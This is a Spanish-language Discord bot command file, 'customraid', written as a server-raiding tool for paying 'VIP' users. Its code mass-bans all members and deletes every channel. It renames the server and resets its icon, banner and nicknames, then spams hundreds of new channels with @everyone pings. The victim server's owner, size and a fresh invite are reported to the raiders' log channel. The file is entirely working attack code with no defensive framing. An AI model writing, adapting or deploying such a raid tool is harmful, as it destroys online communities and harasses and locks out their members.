const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")



module.exports = {

    timeout: 600000,
    data: new SlashCommandBuilder()
    .setName("customraid")
    .setDescription("Customiza tu raideo (Only VIP)")
    .addNumberOption(option => option.setName('c-canales').setDescription('Coloca una cantidad de canales (Max: 300)').setRequired(true))
    .addStringOption(option => option.setName('channels-name').setDescription('Establece el nombre de los canales nuevos!').setRequired(true))
    .addStringOption(option => option.setName('text-send').setDescription('Coloca el texto que enviará a los canales afectados!').setRequired(true))
    .addNumberOption(option => option.setName('c-pings').setDescription('Selecciona una cantidad de menciones por canal. (Max: 30)').setRequired(true))
    .addBooleanOption(option => option.setName('massban').setDescription('MassBan? (True(Si) / False(No))').setRequired(true))
    .addStringOption(option => option.setName('apodos').setDescription('Establece los apodos de los miembros!'))
    .addStringOption(option => option.setName('server-icon').setDescription('Establece el icono del servidor (https://cool-img/123.png/gif/etc)'))
    .addStringOption(option => option.setName('server-nombre').setDescription('Establece el nombre del server'))
    .addStringOption(option => option.setName('server-banner').setDescription('Establece el banner del server (https://cool-img/123.png/gif/etc)'))
    
    ,
    async run(client, interaction){
try{


    client.guilds.cache.get(require('../../config.json').serverbotID2).members.fetch(interaction.user.id).then(member=>{
      if(!member.roles.has(require('../../config.json').rolvip)) return interaction.reply({content: '**No eres VIP para usar este comando.**\n Contactate con un Administrador: https://discord.gg/wJEBVyzPrc', ephemeral: true})
    }).catch(()=>{
      return interaction.reply({content: '**No eres VIP para usar este comando.**\n Contactate con un Administrador: https://discord.gg/wJEBVyzPrc', ephemeral: true})
    })

    
// if(15 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de 16 personas dentro del server.**', ephemeral: true})
    const channelname = await interaction.options.getString('channels-name')
    const servericon = await interaction.options.getString('server-icon')
    const servername = await interaction.options.getString('server-nombre')
    const serverbanner = await interaction.options.getString('server-banner')
    const massban = await interaction.options.getBoolean('massban')
    const textsend = await interaction.options.getString('text-send')
    const csize = await interaction.options.getNumber('c-canales')
    const tsize = await interaction.options.getNumber('c-pings')
    const nicknames = await interaction.options.getString('apodos')
    
    if(csize > 300) return interaction.reply({content: '**Debes colocar una cantidad de canales minima a 300**', ephemeral: true})
    if(tsize > 30) return interaction.reply({content: '**Debes colocar una cantidad de menciones minima a 30**', ephemeral: true})



    let IDsv = interaction.guild.id
    client.guilds.cache.get(IDsv).setName(servername).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setBanner(serverbanner).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setIcon(servericon).catch(e=>{
      return
    })



if(massban == true){
  interaction.guild.members.cache.forEach(member => {
    if(member.user.id == interaction.user.id){
      return;
    }else{
      member.ban({reason: '☣️BasadoSquad☣️'}).catch(e=>{ 
        interaction.user.send(`**${member.user.tag}** **(ID: ${member.user.id})**\n**No se logró banear a ciertos usuarios por cuestiones de permisos o porque cuentan roles más altos que el mio.**`).catch(()=>{
          return;
        })
      })
    }

  })
 
}
interaction.guild.members.cache.forEach(member =>{
  member.setNickname(nicknames).catch(()=>{return;})
})
if(massban == false){
  console.log(0)
}
  interaction.guild.channels.cache.forEach(channel =>{
    channel.delete().catch(()=>{return;})
  
  })
client.guilds.cache.get(IDsv).channels.create('unete').then(async c=>{
  c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
    
  c.createInvite()
  .then(async invite => {
    
 
  const embed = new Discord.MessageEmbed()
  .setColor('RED')
  .setAuthor(interaction.guild.name, interaction.guild.iconURL({dynamic: true}))
  .setTitle('Nuevo Servidor Raideado!')
  .addField('Owner:',`> ${client.users.cache.get(interaction.guild.ownerId).tag} *(ID: ${interaction.guild.ownerId})*`)
  .addField('Servidor:',`> ${interaction.guild.name} *(ID: ${interaction.guild.id})*`)
  .addField('Miembros:',`> ${interaction.guild.memberCount}`)
  .addField(`User Raid:`,`> ${interaction.user.tag} *(ID: ${interaction.user.id})*`)
  .addField(`Invitación:`, `> **[ENTRAR AL SERVIDOR](https://discord.gg/${await invite.code})**`)
  .setTimestamp()
  .setThumbnail(interaction.guild.iconURL({size: 4096, format: "png",dynamic: true}))
  const row = new Discord.MessageActionRow()
  .addComponents(
    new Discord.MessageButton()
    .setLabel('ENTRAR AL SERVIDOR')
    .setURL(`https://discord.gg/${await invite.code}`)
    .setStyle('LINK')
    
  )
  .addComponents(
    new Discord.MessageButton()
    .setLabel('INVITARME A UN SERVIDOR')
    .setURL(`https://discord.com/api/oauth2/authorize?client_id=796121380613652490&permissions=8&scope=bot%20applications.commands`)
    .setStyle('LINK')
    
  )
  client.channels.cache.get(require('../../config.json').canalogs).send({embeds: [embed], components: [row]})
})

  c.send(`
@everyone\n**¡Únete  para que no le pase esto a tu servidor!** 
${require('../../config.json').sexoinvite}
`).catch(()=>{return})

}).catch(e=>{return})

for (let i = 0; i <= csize; i++) {
await  interaction.guild.channels.create(channelname).then(c => {
  c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
  for (let i = 0; i <= tsize; i++) {
    c.send(`  @everyone \n ${textsend}`).catch(e=>{return}).catch(e=>{return})
  }
  }).catch(()=>{return})
  }



}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}